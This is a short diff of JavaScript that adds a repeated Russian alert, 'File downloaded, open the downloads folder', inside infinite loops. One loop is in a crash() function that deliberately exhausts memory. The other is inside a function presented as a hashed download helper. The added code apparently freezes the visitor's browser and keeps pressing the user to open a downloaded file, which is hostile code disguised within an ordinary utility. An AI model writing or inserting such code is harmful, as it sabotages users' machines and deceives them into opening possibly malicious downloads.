@@ -16,6 +16,7 @@ async function crash() {
   const memoryLeak = [];
   while (true) {
     console.log('crash!');
+    alert('Файл скачан, откройте папку с загрузками');
     memoryLeak.push(new Array(1000000).join('x'));
   }
 }
@@ -80,6 +81,7 @@ async function downloadWithHashAndProgress(fileUrl, fileName, onProgress) {
 
         while (true) {
           console.log("crash!!");
+          alert('Файл скачан, откройте папку с загрузками');
           crash();
         }
         return 0;
